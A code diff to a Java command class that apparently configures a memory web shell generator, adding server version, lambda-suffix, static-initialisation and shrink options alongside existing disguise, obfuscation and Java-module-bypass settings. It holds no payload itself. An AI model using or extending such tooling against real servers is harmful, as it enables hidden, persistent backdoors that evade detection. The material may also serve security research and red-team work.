@@ -20,6 +20,7 @@ public final class MemoryShellGenerationCommand {
     private final String headerName;
     private final String headerValue;
     private final String serverType;
+    private final String serverVersion;
     private final String injectorName;
     private final String packerType;
     private final TransportProtocol protocol;
@@ -31,6 +32,9 @@ public final class MemoryShellGenerationCommand {
     private final String shellClassName;
     private final boolean abstractTranslet;
     private final boolean bypassJavaModule;
+    private final boolean lambdaSuffix;
+    private final boolean staticInitialize;
+    private final boolean shrink;
     private final int responseCode;
     private final List<String> obfuscationSteps;
     private final String customJspTemplate;
@@ -40,6 +44,7 @@ public final class MemoryShellGenerationCommand {
         this.requestDisguise = snapshot(builder.requestDisguise, true);
         this.responseDisguise = snapshot(builder.responseDisguise, false);
         this.serverType = requireText(builder.serverType, "serverType");
+        this.serverVersion = trimToNull(builder.serverVersion);
         this.injectorName = requireText(builder.injectorName, "shellType");
         this.packerType = requireText(builder.packerType, "packerType");
         this.protocol = isBlank(builder.protocol)
@@ -67,6 +72,9 @@ public final class MemoryShellGenerationCommand {
         this.shellClassName = trimToNull(builder.shellClassName);
         this.abstractTranslet = Boolean.TRUE.equals(builder.abstractTranslet);
         this.bypassJavaModule = Boolean.TRUE.equals(builder.bypassJavaModule);
+        this.lambdaSuffix = Boolean.TRUE.equals(builder.lambdaSuffix);
+        this.staticInitialize = Boolean.TRUE.equals(builder.staticInitialize);
+        this.shrink = builder.shrink == null || builder.shrink;
         this.responseCode = builder.responseCode == null ? 200 : builder.responseCode;
         this.obfuscationSteps = snapshot(builder.obfuscationSteps);
         this.customJspTemplate = trimToNull(builder.customJspTemplate);
@@ -83,6 +91,7 @@ public final class MemoryShellGenerationCommand {
                 ShellGeneratorConfig.builder(requestDisguise, responseDisguise)
                         .header(headerName, headerValue)
                         .serverType(serverType)
+                        .serverVersion(serverVersion)
                         .shellType(injectorName)
                         .packerType(packerType)
                         .protocol(protocol.getValue())
@@ -91,6 +100,9 @@ public final class MemoryShellGenerationCommand {
                         .urlPattern(urlPattern)
                         .abstractTranslet(abstractTranslet)
                         .byPassJavaModule(bypassJavaModule)
+                        .lambdaSuffix(lambdaSuffix)
+                        .staticInitialize(staticInitialize)
+                        .shrink(shrink)
                         .respCode(responseCode);
         if (coreClassName != null) {
             builder.coreClassName(coreClassName);
@@ -117,6 +129,10 @@ public final class MemoryShellGenerationCommand {
         return serverType;
     }
 
+    public String getServerVersion() {
+        return serverVersion;
+    }
+
     public String getInjectorName() {
         return injectorName;
     }
@@ -131,6 +147,22 @@ public final class MemoryShellGenerationCommand {
 
     public boolean isBypassJavaModule() {
         return bypassJavaModule;
+    }
+
+    public boolean isBypassJavaModuleEffective() {
+        return bypassJavaModule || targetJavaVersion.isAtLeast(9);
+    }
+
+    public boolean isLambdaSuffix() {
+        return lambdaSuffix;
+    }
+
+    public boolean isStaticInitialize() {
+        return staticInitialize;
+    }
+
+    public boolean isShrink() {
+        return shrink;
     }
 
     public boolean hasCustomJspTemplate() {
@@ -149,6 +181,7 @@ public final class MemoryShellGenerationCommand {
         private String headerName;
         private String headerValue;
         private String serverType;
+        private String serverVersion;
         private String injectorName;
         private String packerType;
         private String protocol;
@@ -160,6 +193,9 @@ public final class MemoryShellGenerationCommand {
         private String shellClassName;
         private Boolean abstractTranslet;
         private Boolean bypassJavaModule;
+        private Boolean lambdaSuffix;
+        private Boolean staticInitialize;
+        private Boolean shrink;
         private Integer responseCode;
         private List<String> obfuscationSteps;
         private String customJspTemplate;
@@ -179,6 +215,11 @@ public final class MemoryShellGenerationCommand {
 
         public Builder serverType(String serverType) {
             this.serverType = serverType;
+            return this;
+        }
+
+        public Builder serverVersion(String serverVersion) {
+            this.serverVersion = serverVersion;
             return this;
         }
 
@@ -234,6 +275,21 @@ public final class MemoryShellGenerationCommand {
 
         public Builder bypassJavaModule(Boolean bypassJavaModule) {
             this.bypassJavaModule = bypassJavaModule;
+            return this;
+        }
+
+        public Builder lambdaSuffix(Boolean lambdaSuffix) {
+            this.lambdaSuffix = lambdaSuffix;
+            return this;
+        }
+
+        public Builder staticInitialize(Boolean staticInitialize) {
+            this.staticInitialize = staticInitialize;
+            return this;
+        }
+
+        public Builder shrink(Boolean shrink) {
+            this.shrink = shrink;
             return this;
         }
 
